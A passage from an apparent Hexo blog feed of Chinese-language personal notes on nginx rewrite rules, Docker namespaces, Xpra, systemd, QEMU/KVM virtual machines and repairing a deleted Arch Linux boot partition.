http://127.0.0.1:8080/;<br><span class="hljs-attribute">set</span> <span class="hljs-variable">$query</span> <span class="hljs-variable">$query_string</span>;<br><span class="hljs-attribute">rewrite</span> /dede /wordpress?query?;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="break-命令"><a href="#break-命令" class="headerlink" title="break 命令"></a>break 命令</h4><p>表示完成当前设置的规则后, 不再匹配后面的重写规则.</p><p>语法:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>可以在 server, location, if 字段中使用.</p><p>如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> www.tb.cn www.taob.com;<br><br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$host</span> != <span class="hljs-string">&#x27;www.tb.cn&#x27;</span>) &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/(.*)$</span> http://www.tb.cn/error.txt<br>        <span class="hljs-literal">break</span>;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/(.*)$</span> http://www.tb.cn/<span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-5-案例-Nginx-作为-Web-缓存服务器应用"><a href="#10-5-案例-Nginx-作为-Web-缓存服务器应用" class="headerlink" title="10.5 案例: Nginx 作为 Web 缓存服务器应用"></a>10.5 案例: Nginx 作为 Web 缓存服务器应用</h2><h2 id="10-6-案例-Nginx-作为负载均衡服务器应用"><a href="#10-6-案例-Nginx-作为负载均衡服务器应用" class="headerlink" title="10.6 案例: Nginx 作为负载均衡服务器应用"></a>10.6 案例: Nginx 作为负载均衡服务器应用</h2><p>Nginx 的负载均衡功能是通过 upstream 命令实现的.</p><h3 id="10-6-1-Nginx-的负载均衡算法"><a href="#10-6-1-Nginx-的负载均衡算法" class="headerlink" title="10.6.1 Nginx 的负载均衡算法"></a>10.6.1 Nginx 的负载均衡算法</h3><h2 id="10-7-Nginx-性能优化技巧"><a href="#10-7-Nginx-性能优化技巧" class="headerlink" title="10.7 Nginx 性能优化技巧"></a>10.7 Nginx 性能优化技巧</h2><p>三个方面:</p><ul><li>编译安装</li><li>第三方插件</li><li>系统内核</li></ul><h3 id="10-7-1-编译安装过程优化"><a href="#10-7-1-编译安装过程优化" class="headerlink" title="10.7.1 编译安装过程优化"></a>10.7.1 编译安装过程优化</h3><p>编译之前, 学该相关源代码, 取消 <code>debug</code> 模式.</p><p>注释掉 <code>auto/cc/gcc</code> 中的:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># debug</span><br><span class="hljs-attr">CFLAGS</span>=<span class="hljs-string">&quot; $CFLAGS -g&quot;</span><br></code></pre></td></tr></table></figure><p>使用以下两个参数:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">--with-cc-opt</span>=<span class="hljs-string">&#x27;-O3&#x27;</span><br><span class="hljs-attr">--with-cpu-opt</span>=CPU <span class="hljs-comment"># 这里要指定一个特定的 CPU</span><br></code></pre></td></tr></table></figure><p>利用 <code>cat /proc/cpuinfo | grep &quot;model name&quot;</code> 来确定.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Docker-基础技术</title>
    <link href="/2022/10/01/Docker-%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <url>/2022/10/01/Docker-%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://coolshell.cn/articles/17010.html">参考1</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Linux Namespace 是 Linux 提供的一种内核级别环境隔离的方法.</p><p>Unix 的 chroot 系统调用, 通过修改根目录到一个特定的目录下, 提供一种简单的隔离模式: chroot 内部的文件系统无法访问外部的内容. </p><p><a href="https://lwn.net/Articles/531114/">Linux Namespace 官方文档</a></p><p>主要是三个系统调用:</p><ul><li><code>clone()</code></li><li><code>unshare()</code></li><li><code>setns()</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-关于-Xfce-部分</title>
    <link href="/2022/10/01/ArchWiki-%E5%85%B3%E4%BA%8E-Xfce-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/01/ArchWiki-%E5%85%B3%E4%BA%8E-Xfce-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Xfce">ArchWiki</a><br>Xfce 是一个基于 GTK 3 的轻量级模块化的桌面环境.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装 xfce4 包组, Xfce 默认使用 Xfwm 作为窗口管理器.</p><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><p>添加: <code>exec startxfce4</code> 到 Xinitrc 中.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-关于-Xpra-部分</title>
    <link href="/2022/10/01/ArchWiki-%E5%85%B3%E4%BA%8E-Xpra-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/01/ArchWiki-%E5%85%B3%E4%BA%8E-Xpra-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="参考ArchWiki"><a href="#参考ArchWiki" class="headerlink" title="参考ArchWiki"></a>参考<a href="https://wiki.archlinux.org/title/Xpra">ArchWiki</a></h1><p>Xpra 是 ‘GNU Screen for X’.</p><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h2><p>直接安装 <code>xpra</code> 包或 <code>xpra-git</code> 包在 server 和 clinets.</p><h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2 使用"></a>2 使用</h2><p>使用在 SSH 之上:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra start ssh:user@host --exit-with-children --start-child=<span class="hljs-string">&quot;command&quot;</span><br></code></pre></td></tr></table></figure><p>这个 command 就是你想让远端打开的任务.</p><p>另一种操作见 wiki.</p><p>只有 <code>attach</code> 之后画面才会显示在 local screen.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra attach ssh:user@example.com:7<br></code></pre></td></tr></table></figure><p>若连接本机上面的:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra attach :7<br></code></pre></td></tr></table></figure><p>可以用 <code>detach</code> 或 <code>Ctrl+c</code> detach, 在 detach 之后, 远端的程序会继续运行.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra detach ssh:user@example.com:7<br></code></pre></td></tr></table></figure><h3 id="启用-whole-desktop-environment"><a href="#启用-whole-desktop-environment" class="headerlink" title="启用 whole desktop environment"></a>启用 whole desktop environment</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra start-desktop :7 --start-child=xfce4-session --exit-with-children<br></code></pre></td></tr></table></figure><ul><li><code>:7</code> 指的是 xorg DISPLAY session 的号码</li><li><code>--start-child=xfce4-session</code> 是运行 xfce4 session 作为 xpra server 的子进程</li><li><code>--exit-with-children</code> 表示当 child exit 时 server 将被关闭</li></ul><h1 id="参考-论坛"><a href="#参考-论坛" class="headerlink" title="参考 论坛"></a>参考 <a href="https://unix.stackexchange.com/questions/10597/reattach-to-lost-x11-session/10598#10598">论坛</a></h1><p>打开 remote machine:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra start :13<br></code></pre></td></tr></table></figure><p>attach 到远端:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ xpra attach ssh:remote:13<br></code></pre></td></tr></table></figure><p>显示画面:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ DISPLAY=:13 xeyes<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于网络极其不稳定-在-arch</title>
    <link href="/2022/10/01/%E5%85%B3%E4%BA%8E%E7%BD%91%E7%BB%9C%E6%9E%81%E5%85%B6%E4%B8%8D%E7%A8%B3%E5%AE%9A-%E5%9C%A8-arch/"/>
    <url>/2022/10/01/%E5%85%B3%E4%BA%8E%E7%BD%91%E7%BB%9C%E6%9E%81%E5%85%B6%E4%B8%8D%E7%A8%B3%E5%AE%9A-%E5%9C%A8-arch/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://www.linuxquestions.org/questions/linux-networking-3/unstable-wifi-conection-after-base-arch-install-4175709800/">参考1</a></h1><p>似乎是内核的问题:<br><img src="/../img/maybe_useful.png" alt="可能的解决办法"></p><p>也可能是多个网络管理服务的冲突问题:<br><img src="/../img/conflict.png" alt="conflict"></p><h1 id="似乎解决了"><a href="#似乎解决了" class="headerlink" title="似乎解决了"></a>似乎解决了</h1><p>将 <code>NetworkManager</code> 相关的服务 <code>disable</code> 后, 确实没有断开.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-关于-systemctl-部分</title>
    <link href="/2022/10/01/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-systemd-%E7%9A%84%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/01/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-systemd-%E7%9A%84%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Systemd">ArchWiki</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>systemd 是一个 Linux 系统基础组件的集合, 提供了一个系统和服务管理器, 运行为 PID 1 并负责启动其他程序.</p><h1 id="1-systemctl-基本用法"><a href="#1-systemctl-基本用法" class="headerlink" title="1 systemctl 基本用法"></a>1 systemctl 基本用法</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ systemctl -H 用户名@主机名<br></code></pre></td></tr></table></figure><p>可用来远程控制其他机器.</p><h2 id="1-1-使用单元"><a href="#1-1-使用单元" class="headerlink" title="1.1 使用单元"></a>1.1 使用单元</h2><p>通常包括: </p><ul><li>服务 (.service)</li><li>挂载点 (.mount)</li><li>设备 (.device)</li><li>套接字 (.socket)</li></ul><p>一般使用单元文件的全名:</p><ul><li>无扩展名, 默认为 <code>.service</code></li><li>挂载点自动转化为相应的 <code>.mount 单元</code>, <code>/home</code> 等价于 <code>home.mount</code></li><li>与挂载点类似, 设备会自动转化为相应的 <code>.device</code> 单元, <code>/dev/sda2</code> 等价于 <code>dev-sda2.device</code></li></ul><h1 id="2-编写单元文件"><a href="#2-编写单元文件" class="headerlink" title="2 编写单元文件"></a>2 编写单元文件</h1><p>可查看 <code>man systemd.service</code><br>语法来源于 XDG 桌面配置文件 <code>.desktop</code>.</p><ul><li><code>/usr/lib/systemd/system/</code> 是软件包安装的单元</li><li><code>/etc/systemd/system/</code> 是系统管理员安装的单元</li></ul><h1 id="3-目标-target"><a href="#3-目标-target" class="headerlink" title="3 目标 (target)"></a>3 目标 (target)</h1><p>是一个和运行级别 (runlevel) 功能相似又不同的概念.</p><h1 id="6-挂载"><a href="#6-挂载" class="headerlink" title="6 挂载"></a>6 挂载</h1><p>systemd 也负责按 <code>/etc/fstab</code> 挂在目录.</p><h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="列出所有状态为-enable-的服务"><a href="#列出所有状态为-enable-的服务" class="headerlink" title="列出所有状态为 enable 的服务"></a>列出所有状态为 enable 的服务</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ systemctl list-unit-files --state=enabled<br></code></pre></td></tr></table></figure><h2 id="按优先级从低到高显示加载目录"><a href="#按优先级从低到高显示加载目录" class="headerlink" title="按优先级从低到高显示加载目录"></a>按优先级从低到高显示加载目录</h2><p>也就是从哪里读取单元文件.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ systemctl show --property=UnitPath<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>了解-QEMU-模拟器以及其和-KVM-的关系</title>
    <link href="/2022/10/01/%E4%BA%86%E8%A7%A3-QEMU-%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%92%8C-KVM-%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <url>/2022/10/01/%E4%BA%86%E8%A7%A3-QEMU-%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%92%8C-KVM-%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<p>QEMU 是 quick emulator 的简称.</p><p>KVM 是 Kernel base Virtual Machina 的简称.</p><p>KVM 可以看作是 QEMU 的加速器, 利用真实硬件的性能来提高模拟软件的性能. 其连接了虚拟机和物理硬件.</p><p>KVM 是基于内核的虚拟机, 是内置于 Linux 内核的 hypervisor.</p><p>KVM 是 QEMU 的一种特殊的运行模式, 这种模式通过内核模块使用 CPU 扩展进行虚拟化.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-kvm-内核模块缺少-virtio-serial</title>
    <link href="/2022/10/01/%E5%85%B3%E4%BA%8E-kvm-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%BA%E5%B0%91-virtio-serial/"/>
    <url>/2022/10/01/%E5%85%B3%E4%BA%8E-kvm-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%BA%E5%B0%91-virtio-serial/</url>
    
    <content type="html"><![CDATA[<p>似乎能正常运行.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Archlinux-中使用-kvm-虚拟机</title>
    <link href="/2022/10/01/Archlinux-%E4%B8%AD%E4%BD%BF%E7%94%A8-kvm-%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <url>/2022/10/01/Archlinux-%E4%B8%AD%E4%BD%BF%E7%94%A8-kvm-%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>首先需要检查各种支持, 然后加载没有加载的模块, 安装 qemu, 准备一个镜像盘, 之后就可以使用.</p><h2 id="创建硬盘镜像"><a href="#创建硬盘镜像" class="headerlink" title="创建硬盘镜像"></a>创建硬盘镜像</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> qemu<span class="hljs-literal">-img</span> create <span class="hljs-operator">-f</span> qcow2 archlinux.qcow2 <span class="hljs-number">40</span>G<br></code></pre></td></tr></table></figure><p>这个东西就相当与是一个硬盘, 或一个分区. 名字无所谓, 但应该要用 <code>.qcow2</code> 作为后缀.</p><h2 id="安装操作系统"><a href="#安装操作系统" class="headerlink" title="安装操作系统"></a>安装操作系统</h2><p>前面制作的是硬盘. 这里其实就是用启动盘 (<code>.iso</code>) 文件, 来启动并安装, 相当于装系统的时候 USB 启动.</p><p>使用无界面 (headless) 模式时, 将会默认在本地 5900 端口启动一个 VNC 服务器, 可以用 TigerVNC 连接到客户机的系统上: <code>vncviewer :5900</code>.</p><h2 id="运行虚拟化的系统"><a href="#运行虚拟化的系统" class="headerlink" title="运行虚拟化的系统"></a>运行虚拟化的系统</h2><p>根据客户机的架构, 使用 <code>qemu-system-*</code> 程序, 如 <code>qemu-system-x86_64</code>.</p><p>这个是启动的命令, 后面跟如 <code>archlinux.qcow2</code>. 就同选择一个硬盘来启动:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 archlinux.qcow2<br></code></pre></td></tr></table></figure><h2 id="宿主机和虚拟机数据交互"><a href="#宿主机和虚拟机数据交互" class="headerlink" title="宿主机和虚拟机数据交互"></a>宿主机和虚拟机数据交互</h2><p>默认情况下, 用户模式的客户机能够通过 <code>10.0.2.2</code> 这个 IP 访问到宿主机. 任何运行于宿主机上的服务端程序都可以通过这个地址被访问到.</p><h2 id="QEMU-端口转发"><a href="#QEMU-端口转发" class="headerlink" title="QEMU 端口转发"></a>QEMU 端口转发</h2><p>QEMU 能够将宿主机的端口转发到客户机上.</p><p>就像端口绑定, 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 disk_image -nic user,hostfwd=tcp::10022-:22<br></code></pre></td></tr></table></figure><h2 id="挂载-qcow2-镜像内的分区"><a href="#挂载-qcow2-镜像内的分区" class="headerlink" title="挂载 qcow2 镜像内的分区"></a>挂载 qcow2 镜像内的分区</h2><h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><p>用 <code>-vnc :x</code> 选项.</p><p>基本的口令验证, 使用 <code>password</code>选项设置访问口令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -vnc :0,password -monitor stdio<br></code></pre></td></tr></table></figure><p>口令被限制在 8 个字符内.</p><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>通过 <code>-cpu host</code> 选项让 QEMU 模拟宿主机上的特定 CPU.</p><p>如果宿主机有多个核心, 可以用 <code>-smp</code> 为客户机分配更多核心.</p><p>默认情况下, QEMU 仅仅为每台虚拟机分配 128MB 内存, 可以使用 <code>-m</code> 选项分配更多内存.</p><h2 id="汇总命令"><a href="#汇总命令" class="headerlink" title="汇总命令"></a>汇总命令</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -drive file=xxx.qcow2 -cdrom iso_image -boot menu=on -enable-kvm -vnc :x,password -monitor stdio -m 10G<br></code></pre></td></tr></table></figure><p><code>-drive file=</code> 用来指定硬盘, 这里是如 <code>archlinux.qcow2</code>.</p><p><code>-cdrom </code> 这里是指定启动光盘, 就是 <code>.iso</code> 文件.</p><p>指定 <code>-boot menu=on</code> 可启用 boot 菜单.</p><p><code>-boot</code> 选项指定启动顺序, 有三种:</p><ul><li><code>a</code>, 从软盘启动</li><li><code>c</code>, 从硬盘启动</li><li><code>d</code>, 从光驱启动</li></ul><p><code>-enable-kvm</code> 是启动 kvm 模式.</p><p><code>-monitor stdio</code> 表示从标准输入 (stdio) 获取输入来指定密码.</p><p><code>-usb -device usb-tablet</code> 选项避免点击客户机系统的窗口时鼠标被捕获. 若没有这个选项, 使用 <code>Ctrl+Alt+g</code> 来放开捕获.</p><p>这里为什么要加 <code>-m 10G</code>, 可能是因为安装系统的时候所占的空间大于 128MB.</p><h2 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h2><p>尝试了一下的命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64  -cdrom ubuntu-22.04.1-live-server-amd64.iso -boot order=d -drive file=ubuntu22.qcow2 -enable-kvm -m 10G<br></code></pre></td></tr></table></figure><p>然后就可以用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ vncviewer :5900<br></code></pre></td></tr></table></figure><p>访问.</p><p>提示里面说用 <code>::1:5900</code> 访问, 但不行.</p><p>这里是安装系统. 安装完之后退出, 用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ qemu-system-x86_64 -m 10G ubuntu22.qcow2<br></code></pre></td></tr></table></figure><p>重新进入系统, 这里也要指定 <code>-m</code>.</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><a href="https://computingforgeeks.com/install-kvm-qemu-virt-manager-arch-manjar/">参考</a></h1>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-中关于-Qt-部分</title>
    <link href="/2022/10/01/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Qt-%E9%83%A8%E5%88%86/"/>
    <url>/2022/10/01/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Qt-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Qt">ArchWiki</a><br>Qt 是一个跨平台的应用程序和图形组件工具包, 使用标准 C++, 同时对 C++ 作出了功能扩展, 通过使用特别的代码生成器以及数个宏来扩展语言的功能.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Archlinux-误删-boot-启动分区后重新安装分区</title>
    <link href="/2022/09/30/%E5%85%B3%E4%BA%8E-Archlinux-%E8%AF%AF%E5%88%A0-boot-%E5%90%AF%E5%8A%A8%E5%88%86%E5%8C%BA%E5%90%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%E5%88%86%E5%8C%BA/"/>
    <url>/2022/09/30/%E5%85%B3%E4%BA%8E-Archlinux-%E8%AF%AF%E5%88%A0-boot-%E5%90%AF%E5%8A%A8%E5%88%86%E5%8C%BA%E5%90%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%E5%88%86%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="新建-boot-分区"><a href="#新建-boot-分区" class="headerlink" title="新建 /boot 分区"></a>新建 <code>/boot</code> 分区</h2><p>先创建一个新的 <code>/boot</code> 分区:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ fdisk -l<br></code></pre></td></tr></table></figure><p>之后利用 <code>fdisk</code> 创建一个 <code>/boot</code> 分区, 大小为 <code>1G</code> 左右.</p><h2 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h2><p>和安装时差不多, 先挂在 <code>/</code> 根目录所在分区, 再挂载 <code>/boot</code> 分区. 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ mount /dev/nvme0n1p6 /mnt<br>$ mount /dev/nvme0n1p8 /mnt/boot<br></code></pre></td></tr></table></figure><p>然后生成文件系统表来自动挂载分区, 可以先删除原先的:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure><h2 id="安装内核"><a href="#安装内核" class="headerlink" title="安装内核"></a>安装内核</h2><p>需要重新安装 linux 内核:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ arch-chroot /mnt<br>$ pacman -S base linux linux-firmware<br></code></pre></td></tr></table></figure><p>可能需要先修改 <code>/etc/pacman.d/mirrorlist</code> 中的顺序.</p><h2 id="安装引导"><a href="#安装引导" class="headerlink" title="安装引导"></a>安装引导</h2><p>先安装徽码 (这里是 intel), 实际上这个没有被删除, 可能为 <code>reinstall</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ pacman -S intel-ucode<br></code></pre></td></tr></table></figure><p>装引导:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch --recheck<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure><h2 id="退出并重启"><a href="#退出并重启" class="headerlink" title="退出并重启"></a>退出并重启</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">exit</span><br>$ umount -R /mnt<br>$ reboot<br></code></pre></td></tr></table></figure><p>就 ok 了.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于容器进入后仍然是-bash-shell</title>
    <link href="/2022/09/30/%E5%85%B3%E4%BA%8E%E5%AE%B9%E5%99%A8%E8%BF%9B%E5%85%A5%E5%90%8E%E4%BB%8D%E7%84%B6%E6%98%AF-bash-shell/"/>
    <url>/2022/09/30/%E5%85%B3%E4%BA%8E%E5%AE%B9%E5%99%A8%E8%BF%9B%E5%85%A5%E5%90%8E%E4%BB%8D%E7%84%B6%E6%98%AF-bash-shell/</url>
    
    <content type="html"><![CDATA[<p>原因是 <code>docker run</code> 的时候, 后面的命令是 <code>/bin/bash</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决-bash-Unexpect-end-of-file-error-这一报错</title>
    <link href="/2022/09/30/%E8%A7%A3%E5%86%B3-bash-Unexpect-end-of-file-error-%E8%BF%99%E4%B8%80%E6%8A%A5%E9%94%99/"/>
    <url>/2022/09/30/%E8%A7%A3%E5%86%B3-bash-Unexpect-end-of-file-error-%E8%BF%99%E4%B8%80%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>报错时可能说的是文件的结尾, 但实际上, 出错的地方不在文件的结尾, 而在脚本之中.</p><p>原因为 <code>if</code> 没有用 <code>fi</code> 结尾这一类.</p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CNSS-招新题总结</title>
    <link href="/2022/09/30/CNSS-%E6%8B%9B%E6%96%B0%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <url>/2022/09/30/CNSS-%E6%8B%9B%E6%96%B0%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="懒人福音"><a href="#懒人福音" class="headerlink" title="懒人福音"></a>懒人福音</h1><p>由于从 gitee 上面 clone 私人仓库需要帐号密码, shell 会报错.</p><h1 id="萌新也想搭载上X-引擎"><a href="#萌新也想搭载上X-引擎" class="headerlink" title="萌新也想搭载上X-引擎"></a>萌新也想搭载上X-引擎</h1><p>Docker 容器打开的端口会随机映射到宿主机上的某个端口.</p><p>不仅可以通过 <code>localhost:端口号</code> 来打开页面.</p><p>查看了 docker 容器的 ip 地之后, 可以直接用 docker 容器的 ip 地址访问.</p><h2 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h2><p>在 nginx 配置文件中, 就算不写 location 部分, 如果你知道文件名, 还是可以访问到文件.</p><h3 id="每个端口开放一个网页"><a href="#每个端口开放一个网页" class="headerlink" title="每个端口开放一个网页"></a>每个端口开放一个网页</h3><p>这个就要用 <code>deny</code> 指令, 将其他所有也页面的访问禁止掉.</p><h3 id="关于-autoindex"><a href="#关于-autoindex" class="headerlink" title="关于 autoindex"></a>关于 autoindex</h3><p>如果设置了默认界面, 这个选项就不起作用.</p><p>如果文件为压缩文件, 点击后就可以下载.</p><h3 id="关于-server-部分的再理解"><a href="#关于-server-部分的再理解" class="headerlink" title="关于 server 部分的再理解"></a>关于 server 部分的再理解</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>    <span class="hljs-number">80</span>;    <span class="hljs-comment"># 这个是监听本地的 80 端口</span><br>    <span 